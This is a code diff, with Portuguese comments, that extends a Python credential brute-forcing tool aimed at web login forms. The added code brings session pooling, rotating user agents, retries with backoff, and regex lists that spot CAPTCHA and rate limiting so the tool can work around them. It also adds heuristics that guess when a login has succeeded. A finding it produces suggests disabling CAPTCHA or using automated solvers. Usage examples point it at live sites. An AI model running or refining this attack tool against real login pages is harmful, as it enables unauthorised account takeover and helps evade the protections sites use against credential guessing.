@@ -17,6 +17,8 @@ import time
 import json
 import os
 import itertools
+import re
+import logging
 
 # Tenta importar bibliotecas de terceiros e avisa se não estiverem instaladas
 try:
@@ -26,6 +28,8 @@ try:
     from rich.console import Console
     from rich.table import Table
     from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    import concurrent.futures
     from rich.syntax import Syntax
     from rich.panel import Panel
     from rich.text import Text
@@ -2194,7 +2198,8 @@ def view_file_from_url(url):
 class BruteForceScanner:
     """Scanner para realizar ataques de força bruta em formulários de login."""
     def __init__(self, url, user_field='username', pass_field='password', users=None, pass_wordlist_path=None,
-                 failure_string=None, success_string=None, workers=5, delay=1.0, attack_mode='battering_ram'):
+                 failure_string=None, success_string=None, workers=5, delay=1.0, attack_mode='battering_ram',
+                 max_retries=3, backoff_factor=2.0, session_pool_size=10, enable_logging=False):
         # Normaliza URL
         if not url.startswith(('http://', 'https://')):
             url = 'http://' + url
@@ -2209,17 +2214,36 @@ class BruteForceScanner:
         self.workers = workers
         self.delay = delay
         self.attack_mode = attack_mode
+        self.max_retries = max_retries
+        self.backoff_factor = backoff_factor
+        self.session_pool_size = session_pool_size
+        self.enable_logging = enable_logging
         
-        # Configuração de sessão
-        self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        # Configuração de sessão pool
+        self.session_pool = []
+        for i in range(session_pool_size):
+            session = requests.Session()
+            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+            self.session_pool.append(session)
         
         # Armazenamento de resultados
         self.findings = []
+        self.statistics = {
+            'total_attempts': 0,
+            'successful_attempts': 0,
+            'failed_attempts': 0,
+            'captcha_detected': 0,
+            'rate_limited': 0,
+            'timeouts': 0,
+            'start_time': None,
+            'end_time': None
+        }
         
         # Controle de threads
         self._stop_event = threading.Event()
         self._lock = threading.Lock()
+        self._session_lock = threading.Lock()
+        self._session_index = 0
         
         # User agents para rotação
         self._user_agents = [
@@ -2228,7 +2252,108 @@ class BruteForceScanner:
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
         ]
+        
+        # Padrões de detecção
+        self.captcha_patterns = [
+            r'captcha', r'recaptcha', r'g-recaptcha', r'hcaptcha', r'cloudflare',
+            r'verify.*human', r'anti.*bot', r'security.*check', r'robot.*check'
+        ]
+        
+        self.rate_limit_patterns = [
+            r'too.*many.*requests', r'rate.*limit', r'temporarily.*blocked',
+            r'retry.*later', r'slow.*down', r'flood.*protection', r'abuse.*detected'
+        ]
+        
+        self.success_indicators = [
+            r'welcome', r'dashboard', r'profile', r'logout', r'admin.*panel',
+            r'member.*area', r'user.*panel', r'home.*page', r'main.*menu'
+        ]
+        
+        self.failure_indicators = [
+            r'invalid.*credentials', r'wrong.*password', r'incorrect.*username',
+            r'login.*failed', r'authentication.*failed', r'access.*denied',
+            r'unauthorized', r'forbidden', r'error.*login'
+        ]
+        
+        # Logging setup
+        if self.enable_logging:
+            import logging
+            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+            self.logger = logging.getLogger(__name__)
+        else:
+            self.logger = None
 
+    def _get_session(self):
+        """Obtém uma sessão do pool de forma thread-safe."""
+        with self._session_lock:
+            session = self.session_pool[self._session_index]
+            self._session_index = (self._session_index + 1) % len(self.session_pool)
+            return session
+    
+    def _log(self, message, level='info'):
+        """Log message if logging is enabled."""
+        if self.logger:
+            getattr(self.logger, level)(message)
+    
+    def _detect_captcha(self, response_text):
+        """Detecta presença de CAPTCHA na resposta."""
+        response_lower = response_text.lower()
+        for pattern in self.captcha_patterns:
+            if re.search(pattern, response_lower, re.IGNORECASE):
+                return True
+        return False
+    
+    def _detect_rate_limiting(self, response):
+        """Detecta se houve rate limiting."""
+        if response.status_code == 429:
+            return True
+        
+        response_lower = response.text.lower()
+        for pattern in self.rate_limit_patterns:
+            if re.search(pattern, response_lower, re.IGNORECASE):
+                return True
+        return False
+    
+    def _enhanced_success_detection(self, response, username, password):
+        """Detecção aprimorada de login bem-sucedido."""
+        # Verifica string de sucesso definida pelo usuário
+        if self.success_string and self.success_string in response.text:
+            return True
+        
+        # Verifica string de falha definida pelo usuário
+        if self.failure_string and self.failure_string not in response.text:
+            return True
+        
+        # Heurísticas baseadas em padrões comuns
+        response_lower = response.text.lower()
+        
+        # Verifica indicadores de sucesso
+        success_score = 0
+        for pattern in self.success_indicators:
+            if re.search(pattern, response_lower, re.IGNORECASE):
+                success_score += 1
+        
+        # Verifica indicadores de falha
+        failure_score = 0
+        for pattern in self.failure_indicators:
+            if re.search(pattern, response_lower, re.IGNORECASE):
+                failure_score += 1
+        
+        # Verifica redirecionamentos (indicativo de sucesso)
+        if len(response.history) > 0:
+            success_score += 2
+        
+        # Verifica tamanho da resposta (respostas de sucesso tendem a ser maiores)
+        if len(response.content) > 1000:
+            success_score += 1
+        
+        # Verifica status codes
+        if response.status_code in [200, 302, 301]:
+            success_score += 1
+        
+        # Decisão baseada em score
+        return success_score > failure_score and success_score >= 2
+    
     def _add_finding(self, risk, v_type, detail, recommendation):
         """Adiciona uma descoberta à lista de resultados."""
         finding = {
@@ -2238,6 +2363,7 @@ class BruteForceScanner:
             "Recomendação": recommendation
         }
         self.findings.append(finding)
+        self._log(f"Finding added: {v_type} - {detail}")
     
     def _load_wordlist(self, file_path):
         """Carrega wordlist de um arquivo."""
@@ -2252,19 +2378,35 @@ class BruteForceScanner:
             return []
 
     def _get_login_form(self):
-        """Obtém detalhes do formulário de login."""
-        for attempt in range(3):
+        """Obtém detalhes do formulário de login com retry logic."""
+        session = self._get_session()
+        
+        for attempt in range(self.max_retries):
             try:
-                response = self.session.get(self.url, verify=False, timeout=10)
+                self._log(f"Attempting to fetch login form (attempt {attempt + 1}/{self.max_retries})")
+                response = session.get(self.url, verify=False, timeout=10)
+                
+                # Verifica se há CAPTCHA
+                if self._detect_captcha(response.text):
+                    self.statistics['captcha_detected'] += 1
+                    self._log("CAPTCHA detected on login form", 'warning')
+                    self._add_finding("Médio", "CAPTCHA Detectado", 
+                                    "Formulário de login possui CAPTCHA", 
+                                    "Considere desabilitar CAPTCHA para testes ou use soluções automatizadas")
+                
                 soup = BeautifulSoup(response.content, 'html.parser')
                 break
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
-                if attempt < 2:
-                    time.sleep(2)
+                self.statistics['timeouts'] += 1
+                if attempt < self.max_retries - 1:
+                    wait_time = self.backoff_factor ** attempt
+                    self._log(f"Connection error, retrying in {wait_time}s: {e}", 'warning')
+                    time.sleep(wait_time)
                     continue
                 else:
+                    self._log(f"Failed to connect after {self.max_retries} attempts: {e}", 'error')
                     console.print(f"[bold red][!] Erro de conexão: {e}[/bold red]")
-                    return None, None, None
+                    return None, None, None, None
         
         try:
             # Busca formulário com campos de login
@@ -2275,8 +2417,9 @@ class BruteForceScanner:
                     break
             
             if not form:
+                self._log(f"Login form not found with fields '{self.user_field}' and '{self.pass_field}'", 'error')
                 console.print(f"[bold red][!] Formulário não encontrado com campos '{self.user_field}' e '{self.pass_field}'[/bold red]")
-                return None, None, None
+                return None, None, None, None
 
             action_url = urljoin(self.url, form.get('action', self.url))
             method = form.get('method', 'post').lower()
@@ -2288,14 +2431,21 @@ class BruteForceScanner:
                 value = input_tag.get('value', '')
                 if name:
                     form_data[name] = value
-
-            return action_url, method, form_data
+            
+            # Extrai cookies de sessão
+            cookies = session.cookies.get_dict()
+            
+            self._log(f"Form found: {action_url} ({method.upper()})")
+            self._log(f"Form data fields: {list(form_data.keys())}")
+            
+            return action_url, method, form_data, cookies
         except Exception as e:
+            self._log(f"Error parsing form: {e}", 'error')
             console.print(f"[bold red][!] Erro ao analisar formulário: {e}[/bold red]")
-            return None, None, None
+            return None, None, None, None
 
-    def _test_credential(self, username, password, action_url, method, form_data):
-        """Testa um par de credenciais."""
+    def _test_credential(self, username, password, action_url, method, form_data, cookies):
+        """Testa um par de credenciais com retry logic aprimorado."""
         if self._stop_event.is_set():
             return None
 
@@ -2304,49 +2454,79 @@ class BruteForceScanner:
             import random
             time.sleep(self.delay + random.uniform(0, 0.5))
 
-        # Prepara payload
-        payload = form_data.copy()
-        payload[self.user_field] = username
-        payload[self.pass_field] = password
+        session = self._get_session()
         
-        # Headers realistas
-        import random
-        headers = {
-            'Referer': self.url,
-            'User-Agent': random.choice(self._user_agents),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Connection': 'keep-alive'
-        }
-        
-        try:
-            if method == 'post':
-                response = self.session.post(action_url, data=payload, headers=headers, verify=False, timeout=10, allow_redirects=True)
-            else:
-                response = self.session.get(action_url, params=payload, headers=headers, verify=False, timeout=10, allow_redirects=True)
-            
-            # Análise da resposta
-            success = False
-            
-            # Verifica string de sucesso
-            if self.success_string:
-                success = self.success_string in response.text
-            # Verifica string de falha
-            elif self.failure_string:
-                success = self.failure_string not in response.text
-            # Heurísticas se não há strings definidas
-            else:
-                success = (response.status_code in [200, 302, 301] and 
-                          (len(response.history) > 0 or len(response.content) > 500))
-            
-            if success:
-                with self._lock:
-                    if not self._stop_event.is_set():
-                        self._stop_event.set()
-                        return (username, password)
-
-        except requests.RequestException:
-            pass
+        for attempt in range(self.max_retries):
+            try:
+                self.statistics['total_attempts'] += 1
+                
+                # Prepara payload
+                payload = form_data.copy()
+                payload[self.user_field] = username
+                payload[self.pass_field] = password
+                
+                # Headers realistas
+                import random
+                headers = {
+                    'Referer': self.url,
+                    'User-Agent': random.choice(self._user_agents),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Connection': 'keep-alive',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+                
+                # Aplica cookies de sessão
+                if cookies:
+                    session.cookies.update(cookies)
+                
+                if method == 'post':
+                    response = session.post(action_url, data=payload, headers=headers, 
+                                          verify=False, timeout=10, allow_redirects=True)
+                else:
+                    response = session.get(action_url, params=payload, headers=headers, 
+                                         verify=False, timeout=10, allow_redirects=True)
+                
+                # Verifica rate limiting
+                if self._detect_rate_limiting(response):
+                    self.statistics['rate_limited'] += 1
+                    self._log(f"Rate limiting detected for {username}:{password}", 'warning')
+                    # Aumenta delay para próximas tentativas
+                    time.sleep(self.delay * 2)
+                    continue
+                
+                # Verifica CAPTCHA
+                if self._detect_captcha(response.text):
+                    self.statistics['captcha_detected'] += 1
+                    self._log(f"CAPTCHA detected for {username}:{password}", 'warning')
+                    return 'captcha'
+                
+                # Análise da resposta com detecção aprimorada
+                success = self._enhanced_success_detection(response, username, password)
+                
+                if success:
+                    self.statistics['successful_attempts'] += 1
+                    self._log(f"Successful login found: {username}:{password}")
+                    with self._lock:
+                        if not self._stop_event.is_set():
+                            self._stop_event.set()
+                            return (username, password)
+                else:
+                    self.statistics['failed_attempts'] += 1
+                    self._log(f"Failed login attempt: {username}:{password}", 'debug')
+                
+                break
+                
+            except requests.RequestException as e:
+                self.statistics['timeouts'] += 1
+                if attempt < self.max_retries - 1:
+                    wait_time = self.backoff_factor ** attempt
+                    self._log(f"Request failed, retrying in {wait_time}s: {e}", 'warning')
+                    time.sleep(wait_time)
+                    continue
+                else:
+                    self._log(f"Request failed after {self.max_retries} attempts: {e}", 'error')
+                    break
         
         return None
 
@@ -2396,7 +2576,7 @@ class BruteForceScanner:
             return self.findings if return_findings else None
 
         # Obtém formulário
-        action_url, method, form_data = self._get_login_form()
+        action_url, method, form_data, cookies = self._get_login_form()
         if not action_url:
             return self.findings if return_findings else None
 
@@ -2469,8 +2649,9 @@ class BruteForceScanner:
         console.print("-" * 60)
 
 def brute_force_scan(url, user_field, pass_field, username, user_list_path, pass_wordlist_path,
-                     failure_string, success_string, workers, delay, attack_mode):
-    """Executa ataque de força bruta em formulários de login."""
+                     failure_string, success_string, workers, delay, attack_mode, max_retries=3,
+                     backoff_factor=2.0, session_pool_size=10, enable_logging=False):
+    """Executa ataque de força bruta em formulários de login com capacidades aprimoradas."""
     
     # Prepara lista de usuários baseada no modo de ataque
     users = []
@@ -2530,6 +2711,9 @@ Exemplos de Uso:
   
   # Modo Pitchfork: testa pares de credenciais do arquivo (formato usuario:senha)
   python %(prog)s brute-force -u https://overthewire.org/login --user-field "username" --pass-field "password" --user-list credentials.txt --attack-mode pitchfork --failure-string "Access denied" --workers 1 --delay 3.0
+  
+  # Com opções avançadas: retry logic, session pooling e logging
+  python %(prog)s brute-force -u https://example.com/login --user-field "user" --pass-field "pass" --username "admin" -w passwords.txt --max-retries 5 --backoff-factor 1.5 --session-pool-size 15 --enable-logging --workers 3 --delay 2.0
 
   [ Utilitários ]
   # Visualiza o conteúdo de um ficheiro online (ex: robots.txt)
@@ -2593,6 +2777,10 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     parser_brute.add_argument('--workers', type=int, default=5, help='Número de threads concorrentes (padrão: 5, recomendado: 1-5).')
     parser_brute.add_argument('--delay', type=float, default=1.0, help='Delay em segundos entre requisições (padrão: 1.0, recomendado: 1.5-3.0).')
     parser_brute.add_argument('--attack-mode', default='battering_ram', choices=['battering_ram', 'pitchfork', 'cluster_bomb'], help='Modo: battering_ram (1 user), cluster_bomb (N users x N passwords), pitchfork (pares user:pass).')
+    parser_brute.add_argument('--max-retries', type=int, default=3, help='Número máximo de tentativas por requisição (padrão: 3).')
+    parser_brute.add_argument('--backoff-factor', type=float, default=2.0, help='Fator de backoff exponencial para retry (padrão: 2.0).')
+    parser_brute.add_argument('--session-pool-size', type=int, default=10, help='Tamanho do pool de sessões HTTP (padrão: 10).')
+    parser_brute.add_argument('--enable-logging', action='store_true', help='Habilita logging detalhado das operações.')
 
 
     # --- Grupo de Reconhecimento & Enumeração ---
@@ -2712,7 +2900,8 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
         if not args.failure_string and not args.success_string:
             parser.error("Pelo menos um de --failure-string ou --success-string deve ser fornecido.")
         brute_force_scan(args.url, args.user_field, args.pass_field, args.username, args.user_list, args.wordlist, 
-                         args.failure_string, args.success_string, args.workers, args.delay, args.attack_mode)
+                         args.failure_string, args.success_string, args.workers, args.delay, args.attack_mode,
+                         args.max_retries, args.backoff_factor, args.session_pool_size, args.enable_logging)
     else:
         parser.print_help()
 
